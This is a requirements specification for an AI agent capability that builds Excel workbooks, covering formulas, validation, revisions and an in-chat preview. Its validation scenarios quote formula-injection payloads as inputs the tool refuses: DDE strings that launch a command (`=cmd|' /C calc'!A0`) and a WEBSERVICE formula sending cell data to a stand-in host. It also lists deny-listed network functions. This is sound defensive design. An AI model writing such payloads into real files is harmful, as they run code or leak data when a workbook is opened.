## ADDED Requirements

### Requirement: Agents create Excel workbooks on request

When the `spreadsheet` capability is enabled on an agent, the agent SHALL offer a `create_spreadsheet` tool that produces an `.xlsx` workbook and delivers it to the user as a download in the conversation. The capability SHALL work on ReAct, Deep and Graph agents.

#### Scenario: User asks for an Excel file

- **GIVEN** an agent with the `spreadsheet` capability enabled
- **WHEN** the user asks for a list of items "as an Excel file"
- **THEN** the agent calls `create_spreadsheet` and the conversation shows a file card that downloads the `.xlsx` file
- **AND** the file opens in Excel and LibreOffice without a repair prompt

#### Scenario: Graph agent selects the capability

- **WHEN** an author enables the capability on a Graph agent
- **THEN** assembly succeeds and the tool is available to the graph

### Requirement: Columns are typed and the sheet is formatted

The system SHALL apply each column's declared type as an Excel number format (`text`, `number`, `integer`, `percent`, `currency`, `date`), show a `currency` column's declared currency (`EUR`, `USD`, `GBP`, `CHF`, `JPY`, `CNY`, `CAD`, `AUD`) as a symbol in its number format, style and freeze the header row, add an auto filter over the data, and set each column width from its declared value or from its content, capped.

#### Scenario: Typed columns

- **GIVEN** a sheet with a `date` column holding `"2026-10-21"` and a `percent` column holding `0.15`
- **WHEN** the workbook is generated
- **THEN** the date cell holds a date value with Excel's built-in short-date format (numFmtId 14), shown in the reader's locale, and the percent cell holds `0.15` displayed as `15%`

#### Scenario: Currency symbol

- **GIVEN** a `currency` column with `currency: "EUR"` holding `1234.5`
- **WHEN** the workbook is generated
- **THEN** the cell holds the number `1234.5` with a number format showing the `€` symbol and two decimals
- **AND** a `currency` column without `currency` uses a two-decimal format without symbol

#### Scenario: Header stays visible

- **WHEN** the workbook is generated
- **THEN** the first row is bold and frozen

### Requirement: Totals are live formulas

When a column declares a total (`sum`, `average`, `min`, `max`, `count`), the system SHALL add one totals row after the data whose cells are Excel formulas over that column's data range, formatted like the column, each written with its computed value cached in the file. The row's label SHALL name the functions used, in the conversation language: Total, Moyenne, Min, Max, Nombre in French (the default) and Total, Average, Min, Max, Count in English.

#### Scenario: Sum of a currency column

- **GIVEN** a `currency` column with `total: "sum"` over rows 2 to 11
- **WHEN** the workbook is generated
- **THEN** row 12 holds `=SUM(C2:C11)` in that column and "Total" in the first text column
- **AND** a reader that does not recalculate (openpyxl with `data_only=True`) reads the sum, not an empty cell

#### Scenario: Label follows the function and the language

- **GIVEN** a column with `total: "average"`
- **WHEN** the workbook is generated for a French conversation
- **THEN** the totals label reads "Moyenne", and "Average" for an English conversation

### Requirement: Invalid input is returned to the model

The system SHALL reject invalid input with an error tool result that names the sheet, row and column at fault, and SHALL NOT write any file in that case. Invalid input includes an empty, duplicated, over-31-character or reserved (`History`) sheet name, a name containing `[ ] : * ? / \` or control characters, a row whose length differs from the column count, a value that cannot be converted to its column type, a non-finite number, a formula sent as a plain string (one that parses as a formula calling a function or referencing a cell, on this sheet, another sheet, another workbook or through DDE, such as `=SUM(B2:B6)`, `=B2/B3`, `='Données 2025'!B2`, `=[x.xlsx]S!A1` or `=cmd|' /C calc'!A0`, or any `=` value in a number, integer, percent or currency column), a number whose lone comma could separate thousands or decimals (`"1,234"`), and a text value holding other cells' JSON (a quote inside the text that closed it early, such as `Loyer", 1200, null], [`), which would otherwise shift the row's values into the wrong cells. Control characters in cells and headers SHALL be removed, never raised as an error.

#### Scenario: Row length mismatch

- **WHEN** the model sends a row with four values for a three-column sheet
- **THEN** the tool returns an error naming the sheet and row with the expected and received value counts, no file is written, and the model can call the tool again in the same turn

#### Scenario: Formula sent as a cell value

- **WHEN** the model sends `=B2/SUM($B$2:$B$6)` in a percent column
- **THEN** the tool returns an error saying a formula is not accepted as a plain value, giving the formula-cell form to send (`{"formula": "=B2/SUM($B$2:$B$6)"}`) and pointing to the column `compute` for per-row calculations and to the column `total` for sums and averages, and no file is written

#### Scenario: Sheet-qualified formula sent as text

- **WHEN** the model sends `='Données 2025'!B2` or `=Synthèse!B2` as a plain text cell
- **THEN** the tool returns the same error with the formula-cell form, instead of writing the text literally

#### Scenario: Ambiguous number

- **WHEN** the model sends `"1,234"` in a number column
- **THEN** the tool returns an error asking for a JSON number and no file is written

#### Scenario: Text swallowing the rest of its row

- **WHEN** the model sends `Loyer", 1200, 1150, null, null, null], [` as a text cell, the remainder of the row and the next row's start caught in one string
- **THEN** the tool returns an error naming the sheet, row and column, saying the text holds other cells' JSON and asking for one plain value per cell, and no file is written
- **AND** ordinary text with quotes or brackets (`Projet "Alpha", phase 2 [voir annexe]`) is kept as typed

#### Scenario: Text pasted with control characters

- **GIVEN** a text cell holding a vertical tab copied from a PDF
- **WHEN** the workbook is generated
- **THEN** the cell holds the text without the control character and the file is delivered

### Requirement: Computed columns are per-row formulas

A column MAY declare `compute` instead of row values: `add`, `subtract`, `multiply` or `divide` between `left` and `right` (each a column header of the same sheet or a number), or `share_of_total` of one `column` (its value divided by that column's total), with an optional `round` (0 to 10 decimals). The system SHALL write one formula per data row using that row's cell addresses on the same sheet and only the `SUM`, `ROUND` and `IFERROR` functions, each with its computed value cached in the file, through the same writer and evaluator as model-written formulas; a result that can divide by zero, or that uses a computed column that can be empty, SHALL be wrapped in `IFERROR(...,"")`. Rows SHALL accept either `null` (any value is ignored) or no value at all for computed columns. A computed column without an explicit type SHALL be `number` (`percent` for `share_of_total`); a column `total` SHALL apply to it as to any numeric column. A `number` computed column with `round` SHALL show that many decimals. The preview SHALL hold the values the formulas yield (an empty source cell counts as 0, a division by zero is empty, `round` rounds halves away from zero). The system SHALL reject, naming the sheet and column and the fix, an unsupported op, a header that matches no column or several columns, a reference to a text or date column, to its own column or to a computed column placed after it, a computed text or date column, a missing operand, two number operands, a division by a literal 0 and a `round` outside 0 to 10.

#### Scenario: Tax-inclusive amount

- **GIVEN** a currency column "HT" in column B and a column "TTC" with `compute: {op: "multiply", left: "HT", right: 1.2}`, and rows `[[100, null]]`
- **WHEN** the workbook is generated
- **THEN** C2 holds `=B2*1.2` with the currency format, and the preview shows 120 for that cell

#### Scenario: Share of a column total

- **GIVEN** a column "Part" with `compute: {op: "share_of_total", column: "Montant"}` and "Montant" in column B over rows 2 to 4
- **WHEN** the workbook is generated
- **THEN** each row holds `=IFERROR(Bn/SUM($B$2:$B$4),"")`, the column is formatted as a percent, and a `total: "sum"` on it adds `=SUM(...)` over its range

#### Scenario: Division by an empty or zero cell

- **GIVEN** a column dividing "Réel" by "Budget" and a row whose Budget is 0 or empty
- **WHEN** the workbook is opened in a spreadsheet application
- **THEN** that cell is empty instead of `#DIV/0!`, and the preview shows it empty

#### Scenario: Reference to a later computed column

- **GIVEN** a computed column whose `left` names a computed column placed after it
- **WHEN** the model calls the tool
- **THEN** the tool returns an error naming the sheet and column and asking to move the column or compute from source columns, and no file is written

#### Scenario: Derived values sent as literals

- **GIVEN** columns "Budget", "Réel" and a literal column "Écart" whose values equal Réel − Budget on every filled row (up to the literal's own rounding)
- **WHEN** the model calls the tool
- **THEN** the file is created as sent, and the tool result names "Écart" with the `compute` that would produce it, asking the model to declare such columns with `compute` next time

#### Scenario: Manual total row noted, file kept

- **GIVEN** a sheet whose "Montant" column sets `total: sum` and whose rows end with a row labelled "Total" (case and spaces ignored; "Total HT" counts, "TotalEnergies" does not) whose total-column cells are empty or equal what the totals row computes
- **WHEN** the model calls the tool
- **THEN** the file is created as sent, and the tool result names the sheet and row as a likely manual total next to the automatic totals row, at most once per sheet; a "Total" row holding other values, or a sheet with no `total` column, gets no note

### Requirement: Charts are not supported yet and the user is told

The tool description SHALL state that charts are not supported yet and that the model MUST still create the workbook with its data and tell the user that charts are not available yet. Chart arguments the model sends anyway (`chart`, `charts`, `graph`, `graphs`, `plot`, `plots`, case ignored, at top level or on a sheet) SHALL be ignored without failing the call, and the success text SHALL say so before its closing sentence.

#### Scenario: Chart requested, workbook without chart and user told

- **GIVEN** a user asking for an Excel file with a chart, and the model sending a valid workbook plus a `chart` argument (top level or on a sheet)
- **WHEN** the tool runs
- **THEN** the workbook is created with its data and no chart, the card is shown, and the tool result says "Note: charts are not supported yet; the workbook was created without the chart. Tell the user." before "reply now"; a call without chart arguments gets no such note, and the argument never appears in the tool schema

### Requirement: Size limits are enforced

The system SHALL refuse a workbook above 10 sheets, 50 columns per sheet, 5 000 rows per sheet, 50 000 cells in total, 2 000 characters per cell or header, or 10 MB of output, with an error tool result stating the limit and telling the model to inform the user plainly and suggest splitting the data. It SHALL never truncate data silently.

#### Scenario: Too many rows

- **WHEN** a sheet holds 5 001 rows
- **THEN** the tool returns an error stating the 5 000-row limit and asking the model to tell the user and suggest splitting, and no file is written

### Requirement: Generated workbooks run no code

The system SHALL write `.xlsx` only (never macro-enabled formats), SHALL write formulas only from `total`, `compute`, a column `formula` and formula cells, each validated against the function allow-list, and SHALL store any other accepted text cell starting with `=`, `+`, `-`, `@`, tab or carriage return as literal text. The system SHALL refuse a text cell, header or sheet name that starts with `=`, `+`, `-` or `@` (full-width forms included) and holds a DDE pattern (`name|`) or an external-workbook pattern (`[book.xlsx]`, a path or URL before `!`), even as text.

#### Scenario: Data that looks like a formula

- **GIVEN** a text cell `=== Section ===` or `@SUM(A1)`
- **WHEN** the workbook is generated
- **THEN** the cell holds that literal string and no formula

#### Scenario: DDE text refused

- **WHEN** the model sends the text `=cmd|' /C calc'!A0` or `@SUM(1+1)*cmd|' /C calc'!A0` in a text column
- **THEN** the tool returns an error naming the sheet, row and column, saying the text looks like a link to another program or file and asking to drop the leading sign or rephrase, and no file is written
- **AND** `+33 6 12 34 56 78`, `- point` and `a|b` are kept as literal text

### Requirement: A created file is not created again

The tool description SHALL tell the model to call the tool once per file and to answer the user after a successful creation, and the success result SHALL end with "File created and shown to the user. Do not create it again; reply now." Within one turn, a call identical to one that already created a file (same sanitized file name, sheets and language) SHALL return the first call's text without writing a new file or adding a new card.

#### Scenario: Model repeats a successful call

- **GIVEN** a turn in which `create_spreadsheet` created `Budget T3.xlsx`
- **WHEN** the model calls it again with the same data
- **THEN** no second file is written, no second card is shown, and the result tells the model to reply now

#### Scenario: Model corrects the file

- **WHEN** the model calls the tool again in the same turn with changed rows
- **THEN** a new file and card are created

### Requirement: Authors enable it from the agent form

The agent form SHALL offer the capability as a toggle in the Advanced view and as a "Generate an Excel file" ("Générer un fichier Excel") pack in the Simple view's Document production section, subject to the team's capability availability. The capability SHALL be admin-gated: a platform administrator opens it per team.

#### Scenario: Enable from the Simple view

- **WHEN** an author turns on the "Generate an Excel file" pack for a team that can use the capability
- **THEN** the agent's capability selection contains `spreadsheet`

### Requirement: Users preview the workbook in the chat

Each created workbook SHALL be stored with a JSON preview beside it, and the conversation SHALL show a card that opens a read-only side panel with that preview. The preview SHALL hold the first 500 rows of each sheet and totals computed for display; the `.xlsx` SHALL keep its formulas. When the preview cannot be built or stored, the conversation SHALL show the plain download chip instead and the file SHALL still be delivered.

#### Scenario: Preview opens from the card

- **GIVEN** the agent created a workbook with two sheets in this conversation
- **WHEN** the user clicks the card's Preview button
- **THEN** a side panel opens with the file name and a Download button on top, and one tab per sheet in a strip at the bottom
- **AND** the selected sheet shows as an Excel-like grid: column letters (A, B, ... AA) above, row numbers on the left, the workbook header as row 1 in bold, and the totals row last with its row number in the file
- **AND** the grid scrolls in one area with the column letters, the row numbers and row 1 kept in view

#### Scenario: Sheet tabs overflow the strip

- **GIVEN** a workbook whose sheet tabs are wider than the panel
- **WHEN** the preview is shown
- **THEN** the tab strip does not wrap or show a scrollbar, and arrow buttons at its left scroll the tabs, each disabled at its end
- **AND** selecting a tab, by click or with the arrow keys, scrolls it into view and shows its sheet

#### Scenario: Values follow the column formats and the UI language

- **GIVEN** a sheet with an EUR currency column, a percent column, a date column and a `sum` total
- **WHEN** the preview is shown with the interface in French
- **THEN** the cells read `1 200,00 €`, `12,5 %` and `31/01/2026`, numbers are right-aligned
- **AND** the totals row shows the computed sum in bold below a separator

#### Scenario: Long sheets are capped

- **GIVEN** a sheet of 1 520 rows
- **WHEN** its preview is shown
- **THEN** the grid holds the first 500 rows, totals cover all 1 520 rows, and a note above the sheet tabs says 1 020 more rows are in the file

#### Scenario: Keyboard navigation

- **GIVEN** the preview is open
- **WHEN** the user focuses the grid and presses the arrow keys
- **THEN** the selection moves cell by cell, only the selected cell is focusable, and the formula bar shows its address and formula or value
- **AND** a cell whose text may be cut shows its full text as a tooltip

#### Scenario: Formula bar

- **GIVEN** a sheet with a computed column and a `sum` total
- **WHEN** the user selects a computed cell, by click or with the arrow keys
- **THEN** a bar above the grid shows the cell address in the name box, an "fx" mark, and the cell's formula with that row's addresses (`D2  =IFERROR(ROUND(C2/B2,2),"")`), while the cell shows the computed value
- **AND** a totals cell shows its formula (`=SUM(B2:B4)`), a literal cell its value without number formatting (`1200`, `96%`), and an empty cell nothing
- **AND** the preview JSON carries one formula template per computed column (`{row}` for the row number) and one totals formula per totals column, never one per cell

#### Scenario: A new request makes a new file

- **GIVEN** the agent already created a workbook in this conversation
- **WHEN** the user asks for a corrected version
- **THEN** a new `.xlsx` and a new card are produced, named as the next version (`Budget-v2.xlsx`), and the previous file stays available

#### Scenario: Download from the panel

- **WHEN** the user clicks Download in the panel header
- **THEN** the `.xlsx` is downloaded with the session's credentials

#### Scenario: Preview unavailable

- **GIVEN** the preview cannot be fetched or parsed
- **WHEN** the panel opens
- **THEN** it says the preview is unavailable and the Download button still works

#### Scenario: Preview storage fails

- **GIVEN** the workbook was stored but its preview upload fails
- **WHEN** the tool returns
- **THEN** the conversation shows the plain download chip for the `.xlsx`

### Requirement: Users revise the last workbook with targeted changes

The `create_spreadsheet` tool SHALL accept either `sheets` (the whole workbook) or `changes`, a list of operations applied to the last workbook delivered in the conversation by the same agent: `add_column` (a computed or formula column included), `remove_column`, `edit_column`, `add_rows`, `remove_rows`, `edit_rows`, `edit_cell`, `rename_sheet`, `add_sheet`, `remove_sheet` and `move_rows` (to an existing sheet, or to a new sheet created with the source's columns). Sheets SHALL be addressed by name, columns by header, rows by their row number in the file (header = row 1) or by a `where` match on a column value. All names and numbers SHALL refer to the base workbook, never shifted by earlier changes of the same call. The system SHALL apply the changes to the stored request and build the whole resulting workbook through the same validation, formulas, writer and preview as a `sheets` call, adjusting formula references like Excel when rows, columns or sheets change. It SHALL reject, listing every bad change with its index and the fix and writing no file: `sheets` and `changes` together, an unknown op, sheet, header or row (naming the existing ones), incompatible changes on the same target, a change that would leave a formula pointing at a removed cell, column or sheet or that moves rows a formula references (naming each dependent formula), a call with no base, and a call that changes nothing.

#### Scenario: Add a computed column

- **GIVEN** the agent delivered `Budget.xlsx` with columns "Poste", "Budget", "Réel" on sheet "Budget"
- **WHEN** the user asks to add a difference column and the model sends `changes: [{op: "add_column", sheet: "Budget", column: {header: "Écart", type: "currency", compute: {op: "subtract", left: "Réel", right: "Budget"}}}]`
- **THEN** `Budget-v2.xlsx` is delivered with the three columns unchanged, "Écart" last holding `=C2-B2` on every row, and the model sent no row data

#### Scenario: Add rows with values

- **WHEN** the model sends `{op: "add_rows", sheet: "Budget", rows: [["Loyer", 1200, 1150]]}`
- **THEN** the row is appended after the last data row, the totals row moves below it, its formulas cover the new row, and a summary formula whose range ended on the last data row covers it too

#### Scenario: Split a table into two sheets

- **GIVEN** a sheet "Ventes" with a "Région" column
- **WHEN** the model sends `{op: "move_rows", sheet: "Ventes", where: {column: "Région", equals: "Sud"}, to_sheet: "Sud"}` and `{op: "rename_sheet", sheet: "Ventes", name: "Nord"}`
- **THEN** the new version has a sheet "Nord" with the other rows and a sheet "Sud" with the same columns and the moved rows, each with its own totals

#### Scenario: Rename a sheet used by formulas

- **GIVEN** a "Synthèse" sheet holding `=SUM('Données 2025'!C2:C50)`
- **WHEN** the model renames "Données 2025" to "Données"
- **THEN** the formula reads `=SUM('Données'!C2:C50)` in the new version

#### Scenario: Remove a column a formula needs

- **WHEN** the model removes the column "Budget" that the computed column "Écart" uses
- **THEN** the tool returns an error naming "Écart" and asking to remove or edit it in the same changes, and no file is written

#### Scenario: Errors listed at once

- **WHEN** a call holds a `remove_rows` of row 40 on a sheet with data rows 2 to 14 and an `edit_rows` on an unknown header
- **THEN** the error lists both changes by index, with the valid row range and the sheet's headers, and the base stays the delivered workbook

#### Scenario: No previous workbook

- **WHEN** the model sends `changes` in a conversation with no delivered workbook for this agent
- **THEN** the tool returns "No file was written: there is no previous workbook in this conversation to change. Send the whole workbook in sheets."

#### Scenario: Nothing changed

- **WHEN** the changes produce the same workbook as the base
- **THEN** the tool returns an error saying nothing changed and not to tell the user it was changed, and no file or card is produced

### Requirement: The revision base survives trimming and replicas

After each delivery the system SHALL store the delivered request, per conversation and agent instance, in a capability-owned table with its own migrations, so that a `changes` call in a later turn finds it on any replica, after the conversation history was trimmed, and on ReAct, Deep and Graph agents. A failed write SHALL NOT fail the delivery. A request too large to store (over 4 MB) SHALL be delivered with a success text saying changes are not available for this file.

#### Scenario: Revision after history trimming

- **GIVEN** a workbook delivered many turns ago, whose tool call is no longer in the model's context
- **WHEN** the user asks to add a row and the request reaches another fred-agents replica
- **THEN** the change applies to that delivered workbook and a new version is delivered

#### Scenario: Graph agent revision

- **WHEN** a Graph agent with the capability calls the tool with `changes` after a delivery
- **THEN** the change applies as on a ReAct agent

### Requirement: Versions are named and the latest is marked

A `changes` call, or a `sheets` call with the same file name as the base, SHALL deliver the next version of the same workbook, named `<name>-v<n>.xlsx` from version 2; a `sheets` call with another file name SHALL start a new workbook at version 1. Every version SHALL be a new file and a new card. The conversation SHALL mark the card of the highest version of each workbook as the latest, live and when the conversation is reloaded; older cards SHALL show their version and keep downloading their own file.

#### Scenario: Latest card moves

- **GIVEN** cards for `Budget.xlsx` and `Budget-v2.xlsx`
- **WHEN** `Budget-v3.xlsx` is delivered
- **THEN** only its card shows "Latest version" ("Dernière version"), the two others show "Version 1" and "Version 2", and reloading the conversation shows the same

### Requirement: Model-written formulas follow an allow-list

A column MAY declare `formula`, the formula of its first data row, which the system SHALL fill down like Excel (relative references shift, `$` references stay); a cell MAY hold `{"formula": "..."}`. The system SHALL accept only functions of the allow-list (math, statistics, conditional aggregates, logical, text, date, `VLOOKUP`, `INDEX`, `MATCH`, `XLOOKUP`, `XMATCH`, `FILTER`, `SORT`, `UNIQUE`), written with English names and commas, and SHALL write each with the prefix Excel expects (`_xlfn.XLOOKUP`, `_xlfn._xlws.FILTER`), dynamic arrays with spill metadata. It SHALL refuse, naming the sheet, cell and the fix: volatile functions (`INDIRECT`, `OFFSET`, `NOW`, `TODAY`, `RAND`, `RANDBETWEEN`, `RANDARRAY`), network, link and environment functions (`WEBSERVICE`, `FILTERXML`, `ENCODEURL`, `IMAGE`, `RTD`, `HYPERLINK`, `CELL`, `INFO`), XLM macro functions, references to another workbook, DDE, unknown functions, defined names, structured table references, R1C1 and whole-column or whole-row references, a French function name or `;` separator (giving the English form), a cycle, a spill that would overwrite a filled cell, and a formula over 8 192 characters or 32 levels of nesting.

#### Scenario: Lookup across sheets

- **GIVEN** sheets "Commandes" and "Tarifs"
- **WHEN** the model declares a column "Prix" with `formula: "=XLOOKUP(B2,Tarifs!A2:A40,Tarifs!B2:B40,\"\")"`
- **THEN** each data row holds that lookup with its own row number, stored as `_xlfn.XLOOKUP`, and opens in Excel without a repair prompt or an `@` prefix

#### Scenario: Dangerous function refused

- **WHEN** the model sends `{"formula": "=WEBSERVICE(\"https://x.example/?\"&A2)"}` or `=HYPERLINK("file:///C:/x")` or `=INDIRECT("B"&A2)`
- **THEN** the tool returns an error naming the sheet and cell and saying the function is not accepted and why, and no file is written

#### Scenario: Filter spill

- **WHEN** a formula cell holds `=FILTER(Ventes!A2:C40,Ventes!B2:B40="Sud")` with empty cells below and to its right
- **THEN** the file holds a dynamic-array formula `_xlfn._xlws.FILTER` and the preview shows the filtered rows
- **AND** if a filled cell lies in the spill area, the tool returns an error naming the cell and the spill size

### Requirement: Cross-sheet references are checked

A reference to another sheet SHALL name a sheet of the same workbook (case ignored) and SHALL be written in canonical form, the exact sheet name quoted when it holds anything other than ASCII letters, digits, `_` and `.`, starts with a digit or looks like a cell address, with `'` doubled. A reference SHALL stay inside the target sheet's columns and rows (header to totals row), and a range SHALL NOT span data rows and the totals row. A summary sheet MAY reference any other sheet of the workbook.

#### Scenario: Summary sheet

- **GIVEN** sheets "Données 2025" and "Synthèse"
- **WHEN** a "Synthèse" cell holds `{"formula": "=SUM(Données 2025!C2:C50)"}` written without quotes, or `{"formula": "=SUM('données 2025'!C2:C50)"}`
- **THEN** the file holds `=SUM('Données 2025'!C2:C50)` with the sum cached, and the preview shows the sum

#### Scenario: Unknown sheet or out-of-range reference

- **WHEN** a formula references `Synthese!B2` in a workbook without that sheet, or `'Données 2025'!H2` on a sheet with columns A to E
- **THEN** the tool returns an error naming the cell, listing the workbook's sheets, or the target's columns A to E and its row range, and no file is written

#### Scenario: Range including the totals row

- **WHEN** a formula sums `'Données 2025'!C2:C60` on a sheet whose totals row is 51
- **THEN** the tool returns an error saying the range would count the totals row and giving `C2:C50`

### Requirement: Formula results are cached and previewed

The system SHALL evaluate every formula of the workbook server-side (totals, computed columns, column formulas, formula cells, across sheets) with Excel's semantics for the allow-list, write each result as the formula's cached value (an error as an Excel error value), set the workbook to recalculate on open, and show the results in the preview. Evaluation SHALL run off the event loop within the build's concurrency bound and SHALL stop with a limit error, telling the model to inform the user, beyond a fixed cell-read budget.

#### Scenario: Viewer without recalculation

- **GIVEN** a workbook with totals, a computed column and a summary sheet
- **WHEN** it is read without recalculation
- **THEN** every formula cell holds the value the preview shows

#### Scenario: Error value

- **WHEN** a formula divides by an empty cell without `IFERROR`
- **THEN** the file caches `#DIV/0!` and the preview shows `#DIV/0!`, as Excel would

#### Scenario: Evaluation budget

- **WHEN** a workbook's formulas would read more cells than the budget allows
- **THEN** the tool returns a limit error asking the model to tell the user and to use `total` or fewer lookups, and no file is written
